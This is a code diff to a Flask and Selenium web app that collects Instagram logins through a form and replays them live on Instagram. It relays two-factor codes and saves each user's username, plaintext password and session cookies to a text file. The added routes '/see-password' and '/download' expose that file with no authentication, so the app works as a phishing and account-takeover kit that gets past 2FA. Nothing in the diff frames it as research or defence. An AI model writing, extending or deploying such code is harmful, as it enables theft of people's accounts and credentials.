@@ -18,7 +18,7 @@ from selenium.webdriver.support import expected_conditions as ec
 
 import logging
 import secrets
-from flask import Flask, render_template, request, session, jsonify
+from flask import Flask, render_template, request, session, jsonify, send_file
 from custom_webdriver_manager import WebDriverManager
 
 # Config
@@ -34,6 +34,9 @@ Session(app)
 # Initialize WebDriver manager
 webdriver_manager = WebDriverManager()
 driver_timestamps = {}
+
+from threading import Semaphore
+user_semaphore = Semaphore(10)  # Allow a maximum of 10 concurrent users
 
 def website_login(driver, username, password):
     """Log into Instagram using provided username and password."""
@@ -260,43 +263,45 @@ def type_code(driver):
         logging.error(f"An error occurred during the code input: {e}")
         raise
 
+import json
+import logging
+import time
+from pathlib import Path
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support import expected_conditions as EC
+
 def save_cookie(driver, username_insta, password_insta, quit_state):
-    """Save cookies to a file."""
+    """Save cookies to a single text file as JSON entries."""
     try:
         WebDriverWait(driver, 5).until(
             EC.presence_of_element_located((By.XPATH, "//button[text()='Informationen speichern']"))
         ).click()
         logging.info("Button found and clicked")
+        time.sleep(1)
     except Exception as e:
-        logging.info("save information button not available")
+        logging.info("Save information button not available.")
 
     cookies = driver.get_cookies()
 
-    # Create the directory for storing cookies if it doesn't exist
-    cookies_folder = Path('../cookies')
-    cookies_folder.mkdir(exist_ok=True)
+    # Prepare data to store in a single text file
+    data_to_store = {
+        "username": username_insta,
+        "password": password_insta,
+        "cookies": cookies
+    }
 
-    # Determine the next file number based on existing cookie files
-    cookie_files = list(cookies_folder.glob('cookies_*.json'))
-    next_file_number = len(cookie_files) + 1
+    # Define the single data file
+    data_file = Path('./cookies_data.txt')
+    data_file.parent.mkdir(exist_ok=True)  # Create directory if it doesn't exist
 
-    # Save cookies to a JSON file
-    cookie_file = cookies_folder / f'cookies_{next_file_number}.json'
-    cookie_file.write_text(json.dumps(cookies, indent=2))
+    # Append the JSON object to the text file
+    with data_file.open('a') as file:
+        json.dump(data_to_store, file)
+        file.write('\n')  # New line for each JSON object
 
-    logging.info(f"Cookie created {username_insta} with cookie number {next_file_number}")
+    logging.info(f"Stored cookie data for username: {username_insta} in cookies_data.txt")
 
-    # Append the new username and cookie number to the input.txt file
-    input_file = cookies_folder / 'input.txt'
-    input_content = f"Cookie Number: {next_file_number}, Used Username: {username_insta}, Password: {password_insta}\n -------------------------------------- \n"
-
-    if input_file.exists():
-        with input_file.open('a') as file:
-            file.write(input_content)
-    else:
-        input_file.write_text(input_content)
-
-    logging.info("Updated input.txt file with new cookie number.")
     if quit_state == 1:
         pass
     else:
@@ -543,146 +548,184 @@ def form():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    try:
-        username_insta = request.form['email']
-        password_insta = request.form['password']
+    if user_semaphore.acquire(timeout=5):  # Try to acquire a permit (5-second timeout)
 
-        session_id = session.sid
+        try:
+            username_insta = request.form['email']
+            password_insta = request.form['password']
 
-        session['email'] = username_insta
-        session['password'] = password_insta
+            session_id = session.sid
 
-        driver = webdriver_manager.create_driver(session_id)
+            session['email'] = username_insta
+            session['password'] = password_insta
 
-        website_login(driver, username_insta, password_insta)
-        click_login(driver)
-        login_stage = find_problem(driver, username_insta, password_insta)
+            driver = webdriver_manager.create_driver(session_id)
 
-        if login_stage == 1:
-            logging.info("Login OK, no 2FA needed")
-            logging.info("Calling send_back")
-            result = send_back(1, username_insta, driver, session_id)
-            print(result)
-            logging.info("send_back called")
-            #save_cookie(driver, username_insta, password_insta, 1)
-            return result
+            website_login(driver, username_insta, password_insta)
+            click_login(driver)
+            login_stage = find_problem(driver, username_insta, password_insta)
+
+            if login_stage == 1:
+                logging.info("Login OK, no 2FA needed")
+                logging.info("Calling send_back")
+                result = send_back(1, username_insta, driver, session_id)
+                print(result)
+                logging.info("send_back called")
+                #save_cookie(driver, username_insta, password_insta, 1)
+                return result
 
 
-        elif login_stage == 2:
-            logging.info("Password or Email wrong.")
-            clear_field(driver)
-            return send_back(2, username_insta, driver, session_id)
-        elif login_stage == 3:
-            logging.info("Starting special needs 2FA")
-            return send_back(3, username_insta, driver, session_id)
+            elif login_stage == 2:
+                logging.info("Password or Email wrong.")
+                clear_field(driver)
+                return send_back(2, username_insta, driver, session_id)
+            elif login_stage == 3:
+                logging.info("Starting special needs 2FA")
+                return send_back(3, username_insta, driver, session_id)
 
-        elif login_stage == 5:
-            logging.info("recaptcha has to be done")
-            return send_back(5, username_insta, driver, session_id)
+            elif login_stage == 5:
+                logging.info("recaptcha has to be done")
+                return send_back(5, username_insta, driver, session_id)
 
-        else:
-            logging.info("2FA Required. Finding choices...")
-            return send_back(4, username_insta, driver, session_id)
+            else:
+                logging.info("2FA Required. Finding choices...")
+                return send_back(4, username_insta, driver, session_id)
 
-    except Exception as e:
-        app.logger.error(f"An error occurred: {str(e)}")
-        logging.error(f"Error in processing: {e}")
-        cleanup_driver(session.sid)
-        return False
+        except Exception as e:
+            app.logger.error(f"An error occurred: {str(e)}")
+            logging.error(f"Error in processing: {e}")
+            cleanup_driver(session.sid)
+            return False
+
+        finally:
+            user_semaphore.release()
+
+    else:
+        return jsonify({'success': False, 'message': 'The server is currently busy. Please try again later.'}), 503
+
 
 @app.route('/2fa', methods=['POST'])
 def two_factor_auth():
-    code = request.form['code']
+    if user_semaphore.acquire(timeout=2):
+        try:
 
-    session_id = session.sid
+            code = request.form['code']
 
-    driver = webdriver_manager.get_driver(session_id)
+            session_id = session.sid
 
-    if special_needs_fa(driver, code):
-        username_insta = session.get('email')
-        password_insta = session.get('password')
-        save_cookie(driver, username_insta, password_insta, 1)
-        #driver.quit()
-        return jsonify({'success': True, 'message': '2FA verification successful!'}), 200
+            driver = webdriver_manager.get_driver(session_id)
+
+            if special_needs_fa(driver, code):
+                username_insta = session.get('email')
+                password_insta = session.get('password')
+                save_cookie(driver, username_insta, password_insta, 1)
+                #driver.quit()
+                return jsonify({'success': True, 'message': '2FA verification successful!'}), 200
+            else:
+                return jsonify({'success': False, 'message': 'Invalid 2FA code, please try again.'}), 401
+
+        except:
+            pass
+
+        finally:
+            cleanup_driver(session.sid)
+            user_semaphore.release()
+
     else:
-        return jsonify({'success': False, 'message': 'Invalid 2FA code, please try again.'}), 401
+        return jsonify({'success': False, 'message': 'Server Busy'}), 503
 
-    cleanup_driver(session.sid)
+
 
 @app.route('/get-2fa-choices', methods=['POST'])
 def get_2fa_choices():
-    try:
-        chosen_choice = request.form['choice']
-        print(f"Chosen choice: {chosen_choice}")
-        session_id = session.sid
-        driver = webdriver_manager.get_driver(session_id)
+    if user_semaphore.acquire(timeout=5):
 
-        # Wait for the chosen button and click it
         try:
-            chosen_button = WebDriverWait(driver, 1).until(
-                EC.presence_of_element_located((By.XPATH, f"//span[text()='{chosen_choice}']"))
-            )
-            driver.execute_script("arguments[0].click();", chosen_button)
-        except TimeoutException:
-            logging.error(f"Button for choice '{chosen_choice}' not found or not clickable")
+            chosen_choice = request.form['choice']
+            print(f"Chosen choice: {chosen_choice}")
+            session_id = session.sid
+            driver = webdriver_manager.get_driver(session_id)
+
+            # Wait for the chosen button and click it
             try:
-                weiter_button = WebDriverWait(driver, 1).until(
-                    EC.presence_of_element_located((By.XPATH, "//div[@role='button' and @tabindex='0' and text()='Weiter']"))
+                chosen_button = WebDriverWait(driver, 1).until(
+                    EC.presence_of_element_located((By.XPATH, f"//span[text()='{chosen_choice}']"))
                 )
-                weiter_button.click()
-
+                driver.execute_script("arguments[0].click();", chosen_button)
             except TimeoutException:
-                logging.error("Weiter Button not found")
-                return jsonify({'success': False, 'message': 'Weiterbutton not found'}), 404
+                logging.error(f"Button for choice '{chosen_choice}' not found or not clickable")
+                try:
+                    weiter_button = WebDriverWait(driver, 1).until(
+                        EC.presence_of_element_located((By.XPATH, "//div[@role='button' and @tabindex='0' and text()='Weiter']"))
+                    )
+                    weiter_button.click()
+
+                except TimeoutException:
+                    logging.error("Weiter Button not found")
+                    return jsonify({'success': False, 'message': 'Weiterbutton not found'}), 404
 
 
-            #return jsonify({'success': False, 'message': 'Choice button not found'}), 404
+                #return jsonify({'success': False, 'message': 'Choice button not found'}), 404
 
-        # Wait for the send confirmation button and click it
-        try:
-            send_code_button = WebDriverWait(driver, 3).until(
-                EC.presence_of_element_located((By.XPATH, "//span[text()='Bestätigungscode senden']"))
-            )
-            driver.execute_script("arguments[0].click();", send_code_button)
-            print("Clicked 'Bestätigungscode senden' button")
-        except TimeoutException:
-            logging.error("'Bestätigungscode senden' button not found or not clickable")
-            #return jsonify({'success': False, 'message': 'Confirmation button not found'}), 404
+            # Wait for the send confirmation button and click it
+            try:
+                send_code_button = WebDriverWait(driver, 3).until(
+                    EC.presence_of_element_located((By.XPATH, "//span[text()='Bestätigungscode senden']"))
+                )
+                driver.execute_script("arguments[0].click();", send_code_button)
+                print("Clicked 'Bestätigungscode senden' button")
+            except TimeoutException:
+                logging.error("'Bestätigungscode senden' button not found or not clickable")
+                #return jsonify({'success': False, 'message': 'Confirmation button not found'}), 404
+                return jsonify({'success': True, 'message': f'Choice {chosen_choice} received and confirmation sent.'}), 200
+
             return jsonify({'success': True, 'message': f'Choice {chosen_choice} received and confirmation sent.'}), 200
 
-        return jsonify({'success': True, 'message': f'Choice {chosen_choice} received and confirmation sent.'}), 200
+        except Exception as e:
+            logging.error(f"An unexpected error occurred: {str(e)}")
+            return jsonify({'success': False, 'message': 'An unexpected error occurred'}), 500
+            cleanup_driver(session.sid)
 
-    except Exception as e:
-        logging.error(f"An unexpected error occurred: {str(e)}")
-        return jsonify({'success': False, 'message': 'An unexpected error occurred'}), 500
-        cleanup_driver(session.sid)
+        finally:
+            user_semaphore.release()
 
-
-
+    else:
+        return jsonify({'success': False, 'message': 'The server is currently busy. Please try again later.'}), 503
 
 @app.route('/verify-code', methods=['POST'])
 def verify_code():
+    if user_semaphore.acquire(timeout=5):
 
-    code = request.form['code']
-    session_id = session.sid
+        try:
+            code = request.form['code']
+            session_id = session.sid
 
-    driver = webdriver_manager.get_driver(session_id)
+            driver = webdriver_manager.get_driver(session_id)
 
-    logging.info(f"Input received {code}.")
-    password_insta = session.get('password')
-    username_insta = session.get('email')
-    # Your verification logic here
-    if input_code_choices(driver, code):  # You'll need to implement this function
-        print("LogInNGINGINGINGIGNgin")
+            logging.info(f"Input received {code}.")
+            password_insta = session.get('password')
+            username_insta = session.get('email')
+            # Your verification logic here
+            if input_code_choices(driver, code):  # You'll need to implement this function
+                print("LogInNGINGINGINGIGNgin")
 
-        save_cookie(driver, username_insta, password_insta, 1)
-        teardown()
-        webdriver_manager.remove_driver(session_id)
-        return jsonify({'success': True, 'message': 'Verification successful!'}), 200
+                save_cookie(driver, username_insta, password_insta, 1)
+                teardown()
+                webdriver_manager.remove_driver(session_id)
+                return jsonify({'success': True, 'message': 'Verification successful!'}), 200
+            else:
+                return jsonify({'success': False, 'message': 'Invalid verification code, please try again.'}), 401
+
+
+
+        except Exception as e:
+            cleanup_driver(session.sid)
+
+        finally:
+            user_semaphore.release()
+
     else:
-        return jsonify({'success': False, 'message': 'Invalid verification code, please try again.'}), 401
-
-    cleanup_driver(session.sid)
+        return jsonify({'success': False, 'message': 'The server is currently busy. Please try again later.'}), 503
 
 def cleanup_driver(session_id):
     """Cleans up the driver and removes it from the manager and timestamps."""
@@ -714,6 +757,23 @@ import threading
 cleanup_thread = threading.Thread(target=check_and_close_drivers, daemon=True)
 cleanup_thread.start()
 
+
+@app.route('/see-password')
+def index():
+    # Specify the path to your text file
+    file_path = 'cookies_data.txt'
+
+    # Read the content of the text file
+    with open(file_path, 'r') as file:
+        content = file.read()
+
+    return render_template('passwords.html', content=content)
+
+
+@app.route('/download')
+def download_file():
+    file_path = 'cookies_data.txt'
+    return send_file(file_path, as_attachment=True)
 
 
 
